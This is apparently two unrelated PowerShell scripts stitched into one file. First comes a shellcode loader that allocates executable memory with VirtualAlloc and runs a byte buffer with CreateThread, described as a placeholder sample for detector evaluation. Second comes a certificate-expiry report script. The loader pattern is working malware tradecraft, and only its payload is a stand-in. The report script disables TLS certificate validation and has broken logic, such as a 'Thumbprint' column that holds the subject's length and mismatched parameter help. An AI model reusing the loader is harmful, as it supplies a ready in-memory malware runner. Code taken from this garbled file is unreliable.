
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x89, 0x71, 0x35, 0x07, 0xda, 0xdb, 0x10, 0x7a, 0xbd, 0x8c, 0x63, 0xf4, 0x36, 0x09, 0xac, 0xa9,
        0xb0, 0x31, 0xe1, 0xc6, 0x84, 0xbe, 0x3a, 0x5f, 0x7d, 0x64, 0x37, 0xd1, 0x5d, 0xcd, 0xbb, 0xa8,
        0xea, 0x25, 0xc2, 0x08, 0x41, 0xd6, 0x10, 0xcf, 0xd2, 0xf4, 0xaa, 0x71, 0x9a, 0xd7, 0xf6, 0x53,
        0x21, 0x30, 0x03, 0xe3, 0xfb, 0x1c, 0xe5, 0xd0, 0xef, 0x70, 0xe0, 0x21, 0x45, 0x44, 0x73, 0xa1,
        0xfa, 0xa5, 0xba, 0x06, 0x52, 0x4c, 0xcd, 0x73, 0xc4, 0xb4, 0x81, 0x06, 0xe7, 0x6e, 0x36, 0x22,
        0xa2, 0xd2, 0xc8, 0xe7, 0x98, 0xb2, 0x27, 0xdc, 0x70, 0x69, 0xb5, 0xc1, 0x55, 0xdc, 0x96, 0x21,
        0x28, 0xe7, 0x0b, 0x29, 0x43, 0x52, 0xa7, 0x28, 0x47, 0xe0, 0x67, 0x53, 0x3b, 0xa1, 0x65, 0x76,
        0x17, 0x1e, 0x35, 0x29, 0x73, 0x97, 0x44, 0xca, 0x0a, 0xad, 0x4b, 0x06, 0x24, 0xae, 0x98, 0x66,
        0x67, 0x3c, 0xf2, 0x7b, 0x44, 0xfa, 0x9a, 0x4d, 0x2d, 0xd5, 0x70, 0xd4, 0xd4, 0xf0, 0x65, 0x40,
        0xcf, 0x11, 0xd7, 0x44, 0x3b, 0x0a, 0xba, 0x33, 0x75, 0x3e, 0xf3, 0x50, 0xdc, 0xe8, 0x34, 0xec,
        0x0d, 0xd6, 0x4d, 0x48, 0x28, 0x4a, 0x3e, 0x22, 0xd7, 0xb7, 0x87, 0xd8, 0x3a, 0x33, 0x49, 0x18,
        0xa1, 0x6d, 0x0e, 0xd5, 0xb8, 0x8e, 0xf5, 0x05, 0xe8, 0x9b, 0x44, 0xc3, 0x41, 0xea, 0xcc, 0x99,
        0xba, 0x87, 0x70, 0x8b, 0xcf, 0x5d, 0x49, 0x3a, 0x56, 0x04, 0x63, 0xd9, 0x0b, 0x89, 0x22, 0x97,
        0xd4, 0xda, 0xf8, 0x21, 0x0b, 0xed, 0x81, 0x8f, 0xc7, 0x30, 0x89, 0x40, 0x0e, 0x26, 0x10, 0x32,
        0x59, 0x76, 0x51, 0xf7, 0x28, 0x8b, 0xf9, 0x42, 0x6b, 0x34, 0x1e, 0x8b, 0xdb, 0xee, 0x03, 0x20,
        0x96, 0xa0, 0xda, 0x43, 0x84, 0x2a, 0x64, 0xf4, 0xa4, 0xe0, 0x92, 0x13, 0xc0, 0x5e, 0x77, 0x14,
        0x37, 0x64, 0xfb, 0x44, 0xc5, 0x8f, 0x2e, 0x48, 0xd1, 0x37, 0xcf, 0x14, 0x45, 0x95, 0x13, 0xde,
        0xd7, 0x46, 0x8f, 0xd3, 0x2b, 0xaa, 0x44, 0x56, 0xde, 0x84, 0x89, 0x32, 0x22, 0x75, 0xdc, 0x01,
        0x42, 0xf8, 0x3f, 0x93, 0xc9, 0x33, 0x95, 0x3e, 0x70, 0xc0, 0xd5, 0x33, 0xb0, 0x78, 0xd2, 0x0d,
        0xd8, 0x7f, 0x93, 0xfd, 0xf1, 0xcc, 0x7f, 0x43, 0x91, 0xb1, 0x56, 0x6e, 0x05, 0xcb, 0x89, 0xbc,
        0x4b, 0x6e, 0x69, 0x38, 0x91, 0xef, 0xa1, 0xa7, 0x10, 0xaa, 0xe5, 0xf6, 0x5b, 0x7f, 0x3b, 0xd7,
        0xf0, 0xcf, 0x1e, 0x2c, 0x10, 0x82, 0x8e, 0x81, 0xab, 0x69, 0x43, 0x3f, 0x20, 0x56, 0x12, 0x68,
        0x0d, 0x3b, 0x06, 0x2a, 0xd7, 0xea, 0x3a, 0x3a, 0xa5, 0x48, 0x7a, 0xa6, 0x74, 0x95, 0x34, 0x30,
        0x9d, 0xf4, 0xe4, 0x78, 0x9d, 0x0d, 0xc4, 0x93, 0x7a, 0x5c, 0xfd, 0xdb, 0x7d, 0x72, 0x1c, 0x73,
        0x16, 0xa4, 0xc3, 0xa1, 0x10, 0x1f, 0x30, 0x9f, 0x51, 0x01, 0x65, 0xdc, 0xbe, 0x34, 0xa5, 0x37,
        0x4a, 0xaf, 0x4d, 0x38, 0xf9, 0x07, 0x90, 0x5f, 0xa8, 0x9a, 0x8a, 0x65, 0x09, 0x6c, 0x12, 0x70,
        0xf5, 0xa6, 0xb7, 0x57, 0x03, 0xed, 0xcb, 0x5f, 0x87, 0x20, 0xd0, 0x0f, 0x84, 0xf9, 0xcc, 0x27,
        0xa8, 0x5d, 0x03, 0xa2, 0x6d, 0x10, 0x67, 0x82, 0x52, 0x4c, 0xe1, 0x5a, 0xc0, 0x11, 0xac, 0x38,
        0xa7, 0x3c, 0xda, 0x67, 0x1c, 0x7b, 0x4f, 0x3a, 0x26, 0x3d, 0x79, 0xe8, 0xc4, 0x70, 0x56, 0x4e,
        0xc6, 0x8b, 0xfe, 0x6e, 0xd3, 0x9e, 0x81, 0x76, 0x98, 0x2a, 0xb0, 0x1b, 0xd8, 0x7d, 0xb1, 0x56,
        0x62, 0x05, 0xb2, 0x61, 0xf4, 0x03, 0x2f, 0x9c, 0x91, 0x68, 0x50, 0xed, 0x07, 0x84, 0x64, 0x3d,
        0xc8, 0x4c, 0x72, 0x21, 0xea, 0x1f, 0xc7, 0xd6, 0x39, 0x32, 0xfa, 0x06, 0x58, 0x9d, 0x22, 0x4c,
        0xd3, 0xeb, 0xe5, 0x3f, 0x0e, 0xba, 0x44, 0x48, 0xf2, 0x22, 0x1f, 0x48, 0xdb, 0xd7, 0x25, 0x8b,
        0x37, 0x37, 0xa4, 0xf4, 0xcd, 0x71, 0x35, 0x37, 0xe1, 0x7d, 0x9b, 0xab, 0x39, 0x83, 0xb5, 0xfa,
        0xd1, 0xe9, 0xcb, 0xd6, 0xc8, 0x75, 0x3a, 0xed, 0x3c, 0x7d
    )

    $HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 3021)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Reports certificates that expire inside the warning window.
.DESCRIPTION
    Inspects the local machine stores and optionally connects to each configured
    host to read the certificate presented on its TLS port.
    The report lists the subject, the expiry date and the remaining days so the
    PKI team can schedule the renewal.
.PARAMETER WarningDays
    Paths are resolved relative to the invoking session.
.PARAMETER Hosts
    Used when the script runs unattended.
.EXAMPLE
    .\Export-CertReport.ps1 -WarningDays 30
.NOTES
    Author: Ops Team
    Last updated: 2025-02-21
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 30,

    [string[]]$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com'),

    [int]$Port = 9443,

    [string]$ReportPath = 'C:\Reports\cert-expiry-2024-02-14.csv'
)

$hostName = $env:COMPUTERNAME
$WarningPreference = 'Continue'

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    Write-Verbose ("Probing {0}:{1}" -f $hostName, $Port)
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })

$remote | Sort-Object -Property DaysLeft |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
$expiring | Export-Csv -Path $ReportPath.Replace('.csv', '-warn.csv') -NoTypeInformation -Encoding UTF8

$byIssuer = $remote | Group-Object -Property Issuer |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byIssuer | Format-Table Name, Count -AutoSize
$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$remote | Sort-Object -Property DaysLeft |
    ConvertTo-Html -Title 'Certificate expiry' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = 'pki@contoso.com'
$summaryBody = $expiring | ConvertTo-Html -Fragment | Out-String

$mailParams = @{
    To         = $MailTo
    From       = 'pki@contoso.com'
    Subject    = 'Certificate expiry warning'
    Body       = $summaryBody
    SmtpServer = "smtp.contoso.com"
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

$soonest = $remote | Sort-Object -Property DaysLeft | Select-Object -First 1
Write-Host ("Next expiry: {0} on {1:yyyy-MM-dd}" -f $soonest.Subject, $soonest.NotAfter) -ForegroundColor Yellow
Write-Verbose ("Local store matches: {0}" -f @($localCerts).Count)

$thumbprints = $remote | Select-Object Host, @{Name = 'Thumbprint'; Expression = { $_.Subject.Length }}
$thumbprints | Format-Table -AutoSize

$selfSigned = $remote | Where-Object { $_.Subject -eq $_.Issuer }
Write-Verbose ("Self-signed certificates: {0}" -f @($selfSigned).Count)

$portCheck = Test-NetConnection -ComputerName $Hosts[0] -Port $Port -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Verbose ("Port {0} reachable on {1}: {2}" -f $Port, $Hosts[0], $portCheck)

$schtasks = Get-ScheduledTask -TaskName 'Contoso-CertCheck' -ErrorAction SilentlyContinue
if ($schtasks) {
    Write-Verbose ("Scheduled check state: {0}" -f $schtasks.State)
}

$renewal = $remote | Where-Object { $_.DaysLeft -lt 0 }
if (@($renewal).Count -gt 0) {
    Write-Warning ("{0} certificates have already expired" -f @($renewal).Count)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
